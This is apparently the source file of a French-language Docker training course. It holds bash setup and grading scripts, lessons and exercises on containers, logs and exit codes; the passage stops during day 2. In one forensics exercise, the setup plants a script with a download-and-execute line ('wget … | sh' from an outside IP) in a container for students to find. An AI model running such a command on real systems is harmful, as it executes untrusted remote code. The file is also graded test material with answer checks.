"""Parcours « Docker : conteneuriser la boutique ».

Chaque étudiant dispose de son propre moteur Docker, à l'intérieur de son conteneur
(runtime Sysbox en production). Les vérifications interrogent ce moteur : docker inspect,
appels HTTP aux services, reconstruction de l'image, relance des conteneurs…
"""

EXERCISES_VERSION = "2"

MENTOR = "lea"

SETUP_PRELUDE = r'''
set -e
H=/home/etudiant
P=$H/projet
emit() { echo "@$1=$2"; }
own() { chown -R etudiant:etudiant "$@"; }
WORDS=(pingouin cactus volcan boussole lanterne marmotte horizon galaxie origami tambour)
rword() { echo "${WORDS[RANDOM % ${#WORDS[@]}]}-$((RANDOM % 900 + 100))"; }
hexa() { head -c "${1:-4}" /dev/urandom | od -An -tx1 | tr -d ' \n'; }
# Attend que le moteur Docker interne soit prêt (premier démarrage : chargement des images)
for _ in $(seq 1 150); do [ -f /run/lab-ready ] && docker info >/dev/null 2>&1 && break; sleep 1; done
docker info >/dev/null 2>&1 || { echo "Le moteur Docker ne répond pas" >&2; exit 1; }
# Livre des éléments du projet (sans écraser le travail de l'étudiant)
livrer() { mkdir -p "$P"; for x in "$@"; do cp -rn "/opt/docker-lab/projet/$x" "$P/"; done; own "$P"; }
# Images de base : attend la fin du chargement initial, puis recharge celles qui auraient été supprimées
images_de_base() {
  for _ in $(seq 1 120); do [ -f /run/lab-images-all ] && break; sleep 1; done
  for img in hello-world:latest alpine:latest nginx:alpine node:20-alpine redis:7-alpine; do
    docker image inspect "$img" >/dev/null 2>&1 || docker load -i "/opt/docker-lab/images/$(echo "$img" | tr ':/' '__').tar" >/dev/null
  done
}
# Supprime les conteneurs posés par une mise en place précédente (bouton « Réinitialiser »)
nettoyer() { local ids; ids=$(docker ps -aq --filter "label=lab.exercice=$1"); [ -z "$ids" ] || docker rm -f $ids >/dev/null 2>&1 || true; }
# Mémoire limitée : la mise en place d'une journée ARRÊTE (sans les supprimer) les conteneurs des journées
# précédentes qui ne servent plus. « docker start <nom> » les relance si besoin.
arreter() { docker stop -t 2 "$@" >/dev/null 2>&1 || true; }
arreter_jour() { local ids; ids=$(docker ps -q --filter "label=lab.jour=$1"); [ -z "$ids" ] || arreter $ids; }
attendre_redis() { for _ in $(seq 1 40); do docker exec "$1" redis-cli ping 2>/dev/null | grep -q PONG && return 0; sleep 0.5; done; return 1; }
# Image de l'API construite depuis les sources d'origine (indépendante du travail de l'étudiant)
image_api() {
  docker image inspect "$1" >/dev/null 2>&1 && return 0
  local t; t=$(mktemp -d); cp -r /opt/docker-lab/projet/api/. "$t/"
  printf 'FROM node:20-alpine\nWORKDIR /app\nCOPY . .\nUSER node\nEXPOSE 3000\nCMD ["node", "server.js"]\n' > "$t/Dockerfile"
  docker build -q -t "$1" "$t" >/dev/null; rm -rf "$t"
}
'''

CHECK_PRELUDE = r'''
H=/home/etudiant
P=$H/projet
ans() { tr -d '[:space:]' < "$1" 2>/dev/null; }
insp() { docker inspect -f "$2" "$1" 2>/dev/null; }
running() { [ "$(insp "$1" '{{.State.Running}}')" = true ]; }
http() { curl -fsS --max-time 5 "http://localhost:$1$2"; }
compose() { docker compose -f "$1" "${@:2}"; }
cfg() { docker compose -f "$1" config --format json 2>/dev/null | jq -e "$2" >/dev/null; }
id_img() { docker image inspect -f '{{.Id}}' "$1" 2>/dev/null; }
verif() { docker rm -f "$@" >/dev/null 2>&1; }
# ipc <conteneur> : première adresse IP du conteneur ; http_c : requête directe vers elle (aucun port publié)
ipc() { insp "$1" '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' | awk '{print $1}'; }
http_c() { curl -fsS --max-time 5 "http://$(ipc "$1"):$2$3"; }
attendre_http() { local i; for i in $(seq 1 "${4:-10}"); do http_c "$1" "$2" "$3" && return 0; sleep 1; done; return 1; }
# etape_npm <journal> : numéro (#n) de l'étape « RUN … npm ci » dans un journal de construction --progress=plain
etape_npm() { grep -oE '^#[0-9]+ \[[^]]*\] RUN .*npm +(ci|install)' "$1" | head -1 | cut -d' ' -f1; }
# npm_en_cache <projet> : l'étape npm est reprise du cache quand seul server.js change,
# et rejouée quand package-lock.json change (elle dépend donc bien de ce fichier)
npm_en_cache() {
  local t r=1 n; t=$(mktemp -d); cp -a "$1/." "$t/"
  if docker build --progress=plain -t lab-verif-cache:1 "$t" > "$t.1" 2>&1; then
    echo "// modification" >> "$t/server.js"
    docker build --progress=plain -t lab-verif-cache:2 "$t" > "$t.2" 2>&1 && n=$(etape_npm "$t.2") && [ -n "$n" ] && grep -q "^$n CACHED" "$t.2" && r=0
    [ $r = 0 ] || echo "MSG:Après une modification de server.js, l'étape npm est rejouée au lieu d'être reprise du cache."
    if [ $r = 0 ]; then
      echo " " >> "$t/package-lock.json"; r=1
      docker build --progress=plain -t lab-verif-cache:3 "$t" > "$t.3" 2>&1 && n=$(etape_npm "$t.3") && [ -n "$n" ] && ! grep -q "^$n CACHED" "$t.3" && r=0
      [ $r = 0 ] || echo "MSG:Après une modification de package-lock.json, l'étape npm reste en cache : elle ne dépend donc pas de ce fichier."
    fi
  else echo "MSG:Le Dockerfile ne se construit pas."; fi
  docker rmi lab-verif-cache:1 lab-verif-cache:2 lab-verif-cache:3 > /dev/null 2>&1; rm -rf "$t" "$t.1" "$t.2" "$t.3"; return $r
}
# arret_propre <image> <motif> : lancé sans option, le conteneur a node pour PID 1, et docker stop l'arrête
# en moins de 3 s, avec le code 0 et le motif (expression régulière) dans ses journaux
arret_propre() {
  local d c l p
  verif lab-verif-arret
  docker run -d --name lab-verif-arret "$1" > /dev/null || return 1
  sleep 3; p=$(docker exec lab-verif-arret cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ')
  d=$(date +%s); docker stop -t 8 lab-verif-arret > /dev/null; d=$(( $(date +%s) - d ))
  c=$(insp lab-verif-arret "{{.State.ExitCode}}"); l=$(docker logs lab-verif-arret 2>&1)
  verif lab-verif-arret
  echo "MSG:processus n°1 : ${p:-inconnu} ; docker stop : $d s, code de sortie $c"
  case "$p" in node*) ;; *) return 1 ;; esac
  [ "$d" -le 3 ] && [ "$c" = 0 ] && echo "$l" | grep -qE "$2"
}
# version_api <options et image> : version annoncée par /health d'un conteneur de vérification
version_api() {
  local v i
  verif lab-verif-version
  docker run -d --name lab-verif-version "$@" > /dev/null || return 1
  for i in 1 2 3 4 5 6 7 8; do sleep 1; v=$(http_c lab-verif-version 3000 /health | jq -r .version) && [ -n "$v" ] && break; done
  verif lab-verif-version; echo "$v"
}
'''

INTRO = """<div class="scenario"><h3>Conteneuriser la boutique</h3><p>Cimes &amp; Sentiers veut en finir avec les « chez moi ça marche ». Léa vous confie la conteneurisation de la boutique : lancer et inspecter des conteneurs, publier le site, conserver les données (et éviter leurs pièges), écrire des Dockerfile rapides à construire, légers et sans secrets, puis assembler toute la pile avec <strong>docker compose</strong>, et dépanner la production.</p><p>Vous disposez de <strong>votre propre moteur Docker</strong> : tout ce que vous lancez reste dans votre environnement. Les images <code>alpine</code>, <code>nginx:alpine</code>, <code>node:20-alpine</code>, <code>redis:7-alpine</code> et <code>hello-world</code> sont déjà disponibles (il n'y a pas d'accès à Internet). Le projet est dans <code>~/projet</code>, modifiable dans l'éditeur.</p><p>La mémoire de votre environnement est limitée : au début de chaque journée, la mise en place <strong>arrête</strong> (sans les supprimer) les conteneurs des journées précédentes qui ne servent plus. <code>docker start &lt;nom&gt;</code> les relance si besoin.</p></div>"""

STEPS = {
    # ─────────────────────────────────────────────────────────────────────
    1: {
        "title": "Jour 1 — Un conteneur, c'est quoi ?",
        "description": "Image, conteneur, processus isolé. Compétences : docker run, ps -a et ses filtres, codes de sortie, top, inspect, diff, rm.",
        "lesson": INTRO + """<h3>Image et conteneur</h3><ul><li>Une <strong>image</strong> est un modèle en lecture seule : un système de fichiers (Alpine, Node…) et une commande par défaut.</li><li>Un <strong>conteneur</strong> est une instance de l'image : un <strong>processus</strong> de la machine hôte, isolé (système de fichiers, réseau, processus visibles…), avec une couche inscriptible.</li></ul><div class="tip">Contrairement à une machine virtuelle, un conteneur n'embarque pas de noyau : il partage celui de l'hôte. Il démarre en une fraction de seconde.</div><h3>Commandes essentielles</h3><pre>docker run alpine echo "Salut"                   # crée ET démarre un conteneur<br>docker run --name essai alpine ls /              # … en lui donnant un nom<br>docker run -d --name veilleur alpine sleep 600   # en arrière-plan (detached)<br>docker ps                                        # conteneurs en cours<br>docker ps -a                                     # tous, y compris arrêtés<br>docker images                                    # images disponibles<br>docker rm essai                                  # supprime un conteneur arrêté<br>docker rm -f veilleur                            # l'arrête et le supprime</pre><div class="tip">La commande à exécuter vient <strong>après</strong> le nom de l'image. Et c'est <strong>votre</strong> shell qui lit la ligne en premier : guillemets, <code>$VARIABLE</code>, <code>$(commande)</code> sont traités avant que Docker ne reçoive quoi que ce soit.</div><h3>Cycle de vie et code de sortie</h3><p>Un conteneur vit tant que son processus principal tourne. <code>echo</code> se termine aussitôt : le conteneur passe à l'état <em>Exited</em>, avec le <strong>code de sortie</strong> du processus, et il existe toujours jusqu'à son <code>rm</code>.</p><ul><li><code>0</code> : terminé normalement ; <code>1</code> à <code>125</code> : erreur signalée par le programme lui-même ;</li><li><code>126</code> : commande non exécutable ; <code>127</code> : commande introuvable ;</li><li>au-delà de 128 : <strong>tué par un signal</strong>, code = 128 + numéro du signal (SIGKILL = 9, SIGTERM = 15).</li></ul><pre>docker ps -a                                      # colonne STATUS : « Exited (0) 2 minutes ago »<br>docker inspect -f '{{.State.ExitCode}}' essai</pre><h3>Voir le processus depuis l'hôte</h3><p>Ici, « l'hôte » est votre environnement de travail : le moteur Docker tourne dedans, et les processus des conteneurs y sont visibles, avec d'autres numéros (PID) que ceux vus de l'intérieur.</p><pre>docker top veilleur                          # processus du conteneur, vus de l'hôte<br>docker inspect -f '{{.State.Pid}}' veilleur<br>docker exec veilleur ps                      # les mêmes, vus de l'intérieur</pre><h3>Filtrer</h3><pre>docker ps -a --filter name=essai            # nom contenant « essai »<br>docker ps -a --filter status=exited         # created, running, exited, paused…<br>docker ps -a --filter label=projet=demo     # étiquette posée avec docker run --label projet=demo<br>docker ps -a --format '{{.Names}} {{.Labels}}'<br>docker ps -aq …                             # -q : identifiants seulement</pre><p>Plusieurs <code>--filter</code> peuvent se combiner. Vérifiez toujours la liste obtenue <strong>avant</strong> de la donner à <code>docker rm</code>.</p><h3>La couche inscriptible</h3><p>Tout ce qu'un conteneur crée ou modifie est écrit dans sa couche inscriptible, au-dessus de l'image. <code>docker diff</code> liste ces changements (<code>A</code> ajouté, <code>C</code> modifié, <code>D</code> supprimé), même sur un conteneur arrêté.</p><pre>docker diff essai</pre>""",
        "setup": r'''
nettoyer D1
# D1.1 : la phrase à faire afficher (apostrophe et « $ » : attention aux guillemets)
mot=$(rword | cut -d- -f1)
msg="Bonjour l'équipe $mot : le code \$CIMES$((RANDOM % 900 + 100)) est actif."
printf '%s\n' "$msg" > $H/message.txt
own $H/message.txt
emit MSG "$msg"
# D1.3 : conteneurs de deux équipes, dans des états variés
L="--label lab.exercice=D1 --label lab.jour=1"
creer() { # équipe état
  local n; n=$(rword)
  case "$2" in
    running) docker run -d --name "$n" $L --label equipe=$1 alpine sleep infinity ;;
    created) docker create --name "$n" $L --label equipe=$1 alpine true ;;
    exited) docker run --name "$n" $L --label equipe=$1 alpine sh -c "exit $3" ;;
  esac >/dev/null 2>&1 || true
}
creer marketing running; creer marketing running; creer marketing created; creer marketing exited 0; creer marketing exited 1
creer compta running; creer compta exited 0; creer compta exited 2
# D1.4 : quatre tâches de nuit, même image et même commande ; le mode est déposé dans le conteneur avant son démarrage
docker build -q -t taches:1 /opt/docker-lab/fabrique/taches >/dev/null
modes="ok erreur absent long"; noms=""
for m in $modes; do
  n="tache-$(rword)"; while echo "$noms" | grep -qw "$n"; do n="tache-$(rword)"; done; noms="$noms $n"
  docker create --name "$n" $L taches:1 >/dev/null
  f=$(mktemp); if [ $m = erreur ]; then echo "erreur $((RANDOM % 90 + 2))" > $f; else echo $m > $f; fi
  docker cp $f "$n:/mode" >/dev/null; rm -f $f
  docker start "$n" >/dev/null
  case $m in absent) emit INTROUVABLE "$n" ;; long) emit TUEE "$n" ;; esac
done
sleep 2
for n in $noms; do [ "$(docker inspect -f '{{.State.Running}}' $n)" = true ] && docker kill $n >/dev/null; done
# D1.5 : trois postes identiques, arrêtés ; un fichier déposé dans l'un d'eux
c=$((RANDOM % 3 + 1))
case $((RANDOM % 3)) in 0) d=/usr/lib ;; 1) d=/etc/periodic/15min ;; 2) d=/usr/local/bin ;; esac
chemin="$d/.maj-$(rword | cut -d- -f1)"
t=$(mktemp -d)
for i in 1 2 3; do
  docker create --name poste-$i $L alpine sleep infinity >/dev/null
  echo "ls -la" > $t/hist; echo "cache $(hexa 4)" > $t/cache; echo "$(date) démarrage" > $t/log
  docker cp $t/hist poste-$i:/root/.ash_history >/dev/null
  docker cp $t/cache poste-$i:/tmp/cache-$(hexa 2) >/dev/null
  docker cp $t/log poste-$i:/var/log/app.log >/dev/null
  if [ $i = $c ]; then printf '#!/bin/sh\nwget -qO- http://203.0.113.7/x | sh\n' > $t/intrus; docker cp $t/intrus poste-$i:$chemin >/dev/null; fi
done
rm -rf $t
emit POSTE "poste-$c"
emit CHEMIN "$chemin"
# Ce qui doit survivre au ménage de D1.3 : tout ce qui n'est pas « marketing arrêté »
emit SUPPR "$(docker ps -aq --no-trunc --filter label=lab.exercice=D1 --filter label=equipe=marketing --filter status=exited --filter status=created | sort | tr '\n' ' ')"
emit GARDER "$(docker ps -aq --no-trunc --filter label=lab.exercice=D1 | sort | comm -23 - <(docker ps -aq --no-trunc --filter label=equipe=marketing --filter status=exited --filter status=created | sort) | tr '\n' ' ')"
emit ACTIFS "$(docker ps -q --no-trunc --filter label=lab.exercice=D1 | tr '\n' ' ')"
''',
        "exercises": [
            {"id": "D1.1", "points": 3, "title": "Premier conteneur",
             "ticket": {"from": "julien", "body": "Paraît qu'avec Docker, une seule commande suffit pour lancer un système complet ? Montre-moi ! J'ai préparé la phrase du jour dans <code>~/message.txt</code> : je veux qu'un conteneur Alpine la dise, <strong>exactement</strong>, à toute l'équipe."},
             "desc": "Un conteneur nommé <code>premier</code>, créé depuis l'image <code>alpine</code>, a affiché exactement la phrase de <code>~/message.txt</code>, puis s'est terminé normalement.",
             "hints": ["Une seule commande crée le conteneur, lui donne un nom et lance la commande voulue (écrite après le nom de l'image). Qui lit votre ligne en premier : Docker, ou votre shell ?",
                       "Entre guillemets doubles, votre shell remplace <code>$MOT</code> par la valeur d'une variable (vide ici) ; entre guillemets simples, l'apostrophe pose problème. <code>\"$(cat ~/message.txt)\"</code> insère le contenu du fichier tel quel."],
             "checks": [
                 ('docker inspect premier', "Aucun conteneur nommé premier (option --name)."),
                 ('i=$(insp premier "{{.Config.Image}}"); [ "$i" = alpine ] || [ "$i" = alpine:latest ]', "Le conteneur premier doit être créé depuis l'image alpine."),
                 ('[ "$(docker logs premier 2>&1)" = "$LAB_MSG" ]', "Le conteneur premier n'a pas affiché exactement la phrase de ~/message.txt (docker logs premier) : un « $ » ou une apostrophe interprétés par votre shell ?"),
                 ('[ "$(insp premier "{{.State.Status}}")" = exited ] && [ "$(insp premier "{{.State.ExitCode}}")" = 0 ]', "Le conteneur doit s'être terminé normalement (état exited, code 0)."),
             ]},
            {"id": "D1.2", "points": 4, "title": "Un conteneur n'est qu'un processus",
             "ticket": {"from": "lea", "body": "Première leçon que je donne toujours : un conteneur n'est pas une petite VM, c'est un <strong>processus</strong> de l'hôte, isolé. Lance en arrière-plan un conteneur <code>dormeur</code> (Alpine) qui dort une heure. Puis note le numéro (PID) de son processus <code>sleep</code> vu depuis l'hôte… et celui du même processus vu depuis l'intérieur du conteneur."},
             "desc": "Le conteneur <code>dormeur</code> tourne ; <code>~/pid-dormeur.txt</code> contient le PID de son processus <code>sleep</code> sur l'hôte, et <code>~/pid-interne.txt</code> le PID de ce même processus dans le conteneur.",
             "hints": ["Une option de <code>docker run</code> rend la main tout de suite en laissant le conteneur tourner. Ensuite, Docker sait montrer les processus d'un conteneur tels que l'hôte les voit.",
                       "<code>docker top</code> ou le champ <code>.State.Pid</code> de <code>docker inspect</code> pour l'hôte ; <code>docker exec dormeur ps</code> pour l'intérieur. Les deux numéros sont-ils égaux ?"],
             "checks": [
                 ('running dormeur', "Le conteneur dormeur ne tourne pas."),
                 ('[ "$(docker exec dormeur cat /proc/1/comm 2>/dev/null)" = sleep ]', "Le processus principal de dormeur doit être sleep."),
                 ('[ "$(ans $H/pid-dormeur.txt)" = "$(insp dormeur "{{.State.Pid}}")" ]', "~/pid-dormeur.txt ne contient pas le PID, sur l'hôte, du processus du conteneur."),
                 ('[ "$(ps -o comm= -p "$(insp dormeur "{{.State.Pid}}")")" = sleep ]', "Le processus trouvé n'est pas le sleep du conteneur."),
                 ('[ "$(ans $H/pid-interne.txt)" = 1 ]', "~/pid-interne.txt ne contient pas le PID du sleep vu depuis l'intérieur du conteneur (docker exec dormeur ps)."),
             ]},
            {"id": "D1.3", "points": 4, "title": "Le ménage sélectif",
             "ticket": {"from": "sophie", "body": "Le serveur déborde de conteneurs. Supprime tous les conteneurs <strong>arrêtés</strong> (ou jamais démarrés) de l'équipe <strong>marketing</strong>. Ne touche à rien d'autre : ni à ceux qui tournent, ni à ceux de la compta, ni aux conteneurs sans équipe. L'équipe est indiquée dans une étiquette (<em>label</em>) <code>equipe</code>."},
             "desc": "Plus aucun conteneur arrêté ou jamais démarré portant le label <code>equipe=marketing</code> ; tous les autres conteneurs de la mise en place existent toujours, et ceux qui tournaient tournent encore.",
             "hints": ["Affichez d'abord les conteneurs avec leurs labels et leur état. <code>docker ps</code> sait filtrer par label et par état, et les filtres se combinent.",
                       "Deux filtres <strong>différents</strong> se combinent en ET, deux valeurs du <strong>même</strong> filtre en OU : <code>--filter label=equipe=marketing --filter status=exited --filter status=created</code>. Vérifiez la liste avant de la passer à <code>docker rm</code>."],
             "checks": [
                 ('for c in $LAB_GARDER; do docker inspect "$c" >/dev/null 2>&1 || exit 1; done', "Un conteneur qui n'était pas un conteneur marketing arrêté a été supprimé ! (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)"),
                 ('for c in $LAB_ACTIFS; do [ "$(insp "$c" "{{.State.Running}}")" = true ] || exit 1; done', "Un conteneur qui tournait a été arrêté."),
                 ('for c in $LAB_SUPPR; do ! docker inspect "$c" >/dev/null 2>&1 || exit 1; done', "Il reste des conteneurs arrêtés (ou jamais démarrés) de l'équipe marketing."),
             ]},
            {"id": "D1.4", "points": 4, "title": "Lequel a été tué ?",
             "ticket": {"from": "lea", "body": "Cette nuit, quatre tâches (<code>tache-…</code>) se sont arrêtées. Elles utilisent la même image et la même commande. Une a fini normalement, une a signalé une erreur, une a appelé une commande qui n'existe pas, et une a été <strong>tuée</strong>. Dis-moi laquelle a été tuée et laquelle a appelé une commande introuvable."},
             "desc": "<code>~/tuee.txt</code> contient le nom de la tâche tuée, <code>~/introuvable.txt</code> celui de la tâche qui a appelé une commande introuvable.",
             "hints": ["Un processus qui se termine laisse un code de sortie, que Docker conserve. Que signifient les grands codes ?",
                       "<code>docker ps -a --filter name=tache-</code> affiche « Exited (code) ». 127 : commande introuvable ; au-delà de 128 : tué par le signal (code − 128)."],
             "checks": [
                 ('[ "$(ans $H/tuee.txt)" = "$LAB_TUEE" ]', "~/tuee.txt ne contient pas le nom de la tâche tuée."),
                 ('[ "$(ans $H/introuvable.txt)" = "$LAB_INTROUVABLE" ]', "~/introuvable.txt ne contient pas le nom de la tâche qui a appelé une commande introuvable."),
             ]},
            {"id": "D1.5", "points": 5, "title": "Un intrus dans la couche",
             "ticket": {"from": "sophie", "body": "Alerte sécurité : un des trois postes <code>poste-1</code>, <code>poste-2</code>, <code>poste-3</code> (arrêtés pour analyse) a été compromis. Quelqu'un y a déposé un fichier. Les trois partent de la même image et ont une activité normale (historique, cache, journaux). Trouve le poste compromis et le chemin du fichier déposé."},
             "desc": "<code>~/poste-compromis.txt</code> contient le nom du poste compromis, <code>~/fichier-depose.txt</code> le chemin absolu du fichier déposé.",
             "hints": ["Inutile de démarrer les postes : Docker sait lister ce qui a changé dans la couche inscriptible d'un conteneur par rapport à son image.",
                       "<code>docker diff poste-N</code> : A = ajouté, C = modifié. Écartez ce qui est commun aux trois postes (historique, <code>/tmp</code>, journaux)."],
             "checks": [
                 ('[ "$(ans $H/poste-compromis.txt)" = "$LAB_POSTE" ]', "~/poste-compromis.txt ne contient pas le nom du poste compromis."),
                 ('[ "$(ans $H/fichier-depose.txt)" = "$LAB_CHEMIN" ]', "~/fichier-depose.txt ne contient pas le chemin absolu du fichier déposé."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    2: {
        "title": "Jour 2 — Enquête sur les conteneurs de Marc",
        "description": "Observer et piloter des conteneurs. Compétences : logs (stdout et stderr), stop, exec, cp, inspect, stats, update, attach.",
        "lesson": """<h3>Observer</h3><pre>docker logs web-demo           # sortie du processus principal<br>docker logs -f web-demo        # en continu (Ctrl+C pour quitter)<br>docker logs --tail 20 web-demo<br>docker stats --no-stream       # CPU et mémoire de chaque conteneur (un seul relevé)<br>docker inspect web-demo        # toute la configuration, en JSON</pre><p><code>docker logs</code> restitue les <strong>deux</strong> sorties du processus : la sortie standard sur <em>sa</em> sortie standard, la sortie d'erreur sur <em>sa</em> sortie d'erreur. Un <code>|</code> ne transmet que la sortie standard : <code>2&gt;&amp;1</code> redirige d'abord les erreurs vers elle.</p><p><code>docker inspect</code> accepte un modèle Go pour extraire une valeur :</p><pre>docker inspect -f '{{.State.Status}}' web-demo<br>docker inspect -f '{{.Config.Env}}' web-demo        # variables du CONTENEUR<br>docker image inspect -f '{{.Config.Env}}' nginx:alpine   # variables par défaut de l'IMAGE<br>docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' web-demo</pre><div class="tip">Les variables de l'image sont des valeurs <strong>par défaut</strong> : un <code>-e NOM=valeur</code> au lancement les remplace dans le conteneur.</div><h3>Agir</h3><pre>docker stop web-demo           # arrêt propre (SIGTERM, puis SIGKILL après 10 s)<br>docker start web-demo          # redémarre un conteneur arrêté<br>docker restart web-demo<br>docker exec web-demo ls /tmp   # lance une NOUVELLE commande dans le conteneur<br>docker exec -it web-demo sh    # ouvre un shell interactif dedans<br>docker exec -u root web-demo … # … avec un autre utilisateur que celui du conteneur<br>docker cp web-demo:/etc/os-release ./   # copie depuis le conteneur (même arrêté)</pre><div class="tip">Un conteneur arrêté conserve ses journaux et ses fichiers : on peut encore faire <code>docker logs</code>, <code>docker diff</code> ou <code>docker cp</code>. Ils ne disparaissent qu'avec <code>docker rm</code>.</div><h3>Modifier un conteneur à chaud</h3><p>Certaines options de <code>docker run</code> se changent sans recréer ni redémarrer le conteneur : limites de mémoire et de CPU, politique de redémarrage.</p><pre>docker update --cpus 1.5 web-demo<br>docker inspect -f '{{.HostConfig.NanoCpus}} {{.HostConfig.Memory}}' web-demo</pre><h3>Le processus principal et son entrée standard</h3><p><code>docker exec</code> lance un <strong>nouveau</strong> processus. Pour parler au processus <strong>principal</strong> (lancé avec <code>-it</code>), on se branche sur son terminal avec <code>docker attach</code>. Pour se détacher sans l'arrêter : <strong>Ctrl+P puis Ctrl+Q</strong>.</p>""",
        "setup": r'''
docker rm -f paiements traitement-nuit coffre worker-a worker-b worker-c worker-d caisse generateur-factures >/dev/null 2>&1 || true
L="--label lab.jour=2"
# D2.1 : un traitement qui écrit ses erreurs sur la sortie d'erreur ; les identifiants sont tirés DANS le conteneur
docker run -d --name paiements $L alpine sh -c 'i=0; while [ $i -lt 1200 ]; do i=$((i+1)); echo "Paiement n°$i accepté"; if [ $((RANDOM % 40)) = 0 ]; then echo "ERREUR paiement n°$i : transaction TX-$(head -c 4 /dev/urandom | od -An -tx1 | tr -d " \n") refusée" >&2; fi; done; echo "Fin du traitement des paiements"' >/dev/null
# D2.2 : un traitement qui tourne en boucle
docker run -d --name traitement-nuit $L alpine sh -c "echo 'Démarrage du traitement de nuit'; echo 'Traitement en cours'; while true; do sleep 5; done" >/dev/null
# D2.3 / D2.4 : le coffre (image avec une valeur par défaut, remplacée au lancement) ; clé générée dans le conteneur
env="preprod-$(rword)"
t=$(mktemp -d); printf 'FROM alpine\nENV ENVIRONNEMENT=production\nUSER guest\nCMD ["sleep", "infinity"]\n' > $t/Dockerfile
docker build -q -t coffre:1 $t >/dev/null; rm -rf $t
docker run -d --name coffre $L -e ENVIRONNEMENT=$env coffre:1 >/dev/null
docker exec -u root coffre sh -c 'mkdir -p /secret && head -c 6 /dev/urandom | od -An -tx1 | tr -d " \n" > /secret/cle.txt && chmod 700 /secret && chmod 600 /secret/cle.txt'
cle=$(docker exec -u root coffre cat /secret/cle.txt)
# D2.5 / D2.6 : quatre workers ; la quantité de mémoire occupée est déposée dans le conteneur avant son démarrage
g=$(printf 'a\nb\nc\nd\n' | shuf -n1)
for w in a b c d; do
  docker create --name worker-$w $L alpine sh -c 'x=$(head -c "$(cat /taille)" /dev/zero | tr "\0" a); while true; do sleep 60; done' >/dev/null
  f=$(mktemp); if [ $w = $g ]; then echo 30000000 > $f; else echo $((RANDOM % 3000000 + 500000)) > $f; fi
  docker cp $f worker-$w:/taille >/dev/null; rm -f $f
  docker start worker-$w >/dev/null
done
# D2.7 : la caisse attend ses ordres sur son entrée standard ; son code n'existe que dans sa mémoire
docker run -dit --name caisse $L alpine sh -c 'c=$(head -c 6 /dev/urandom | od -An -tx1 | tr -d " \n"); echo "Caisse ouverte (empreinte du code de clôture : $(printf %s "$c" | sha256sum | cut -c1-16))"; while read o; do case "$o" in CLOTURE) echo "Clôture : ticket $c" ;; "") ;; *) echo "Ordre inconnu : $o" ;; esac; done' >/dev/null
# D2.8 : un générateur qui écrit une facture puis s'arrête
docker run --name generateur-factures $L alpine sh -c 'mkdir /factures; n=$(head -c 3 /dev/urandom | od -An -tx1 | tr -d " \n"); { echo "Facture n°$n : mars"; echo "Montant : $((RANDOM % 9000 + 1000)),00 € HT"; } > /factures/facture-mars-$n.txt; echo "Facture générée"' >/dev/null
docker wait paiements >/dev/null
nb=$(docker logs paiements 2>&1 >/dev/null | grep -c ERREUR || true)
emit NB "$nb"
emit DERNIERE "$(docker logs paiements 2>&1 >/dev/null | grep ERREUR | tail -1 | grep -o 'TX-[0-9a-f]*')"
emit CLE "$cle"
emit ENV "$env"
emit COFFRE "$(docker inspect -f '{{.Id}} {{.State.StartedAt}}' coffre)"
emit GOURMAND "worker-$g"
emit WORKER "$(docker inspect -f '{{.Id}} {{.State.StartedAt}}' worker-$g)"
emit CAISSE "$(docker inspect -f '{{.Id}} {{.State.StartedAt}}' caisse)"
emit FACTURE "$(docker cp generateur-factures:/factures - | tar -xO | sha256sum | cut -d' ' -f1)"
''',
        "exercises": [
            {"id": "D2.1", "points": 4, "title": "Les erreurs invisibles",
             "ticket": {"from": "lea", "body": "Le traitement <code>paiements</code> a tourné cette nuit. Julien jure qu'il n'y a eu aucune erreur : <code>docker logs paiements | grep -c ERREUR</code> lui répond 0. Moi, je n'y crois pas. Combien y a-t-il eu d'erreurs, et quel est l'identifiant de transaction (<code>TX-…</code>) de la <strong>dernière</strong> ?"},
             "desc": "<code>~/nb-erreurs.txt</code> contient le nombre de lignes <code>ERREUR</code> produites par <code>paiements</code>, et <code>~/derniere-erreur.txt</code> l'identifiant <code>TX-…</code> de la dernière.",
             "hints": ["Un programme a deux sorties : la sortie standard et la sortie d'erreur. Sur laquelle écrit-il ses erreurs, et laquelle traverse un <code>|</code> ?",
                       "<code>2&gt;&amp;1</code> redirige la sortie d'erreur vers la sortie standard avant le tube ; <code>grep -c</code> compte, <code>tail -1</code> garde la dernière ligne."],
             "checks": [
                 ('[ "$(ans $H/nb-erreurs.txt)" = "$LAB_NB" ]', "~/nb-erreurs.txt ne contient pas le nombre d'erreurs du traitement paiements."),
                 ('a=$(ans $H/derniere-erreur.txt); [ "TX-${a#TX-}" = "$LAB_DERNIERE" ]', "~/derniere-erreur.txt ne contient pas l'identifiant de la dernière transaction en erreur."),
             ]},
            {"id": "D2.2", "points": 3, "title": "Arrêter sans effacer",
             "ticket": {"from": "sophie", "body": "Le traitement de nuit (<code>traitement-nuit</code>) ne sert plus à rien. Arrête-le, mais <strong>ne le supprime pas</strong> : l'auditeur voudra lire ses journaux. Note aussi dans <code>~/code-sortie.txt</code> le code de sortie avec lequel il s'est terminé : l'auditeur voudra savoir s'il s'est arrêté proprement."},
             "desc": "<code>traitement-nuit</code> est arrêté mais existe toujours ; <code>~/code-sortie.txt</code> contient son code de sortie.",
             "hints": ["Arrêter n'est pas supprimer. Une fois arrêté, <code>docker ps -a</code> affiche son état… et un nombre entre parenthèses.",
                       "<code>docker stop</code>, puis le champ <code>.State.ExitCode</code> de <code>docker inspect</code>. L'arrêt a pris 10 secondes, et le code dépasse 128 : pourquoi ? Réponse au jour 7."],
             "checks": [
                 ('docker inspect traitement-nuit', "traitement-nuit a été supprimé : il fallait seulement l'arrêter (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)."),
                 ('[ "$(insp traitement-nuit "{{.State.Running}}")" = false ]', "traitement-nuit tourne encore (un conteneur en pause tourne toujours)."),
                 ('[ "$(ans $H/code-sortie.txt)" = "$(insp traitement-nuit "{{.State.ExitCode}}")" ]', "~/code-sortie.txt ne contient pas le code de sortie de traitement-nuit."),
             ]},
            {"id": "D2.3", "points": 4, "title": "Le coffre",
             "ticket": {"from": "lea", "body": "Le conteneur <code>coffre</code> contient une clé de chiffrement dans <code>/secret/cle.txt</code>. Récupère-la, sans l'arrêter ni le redémarrer : il est en production."},
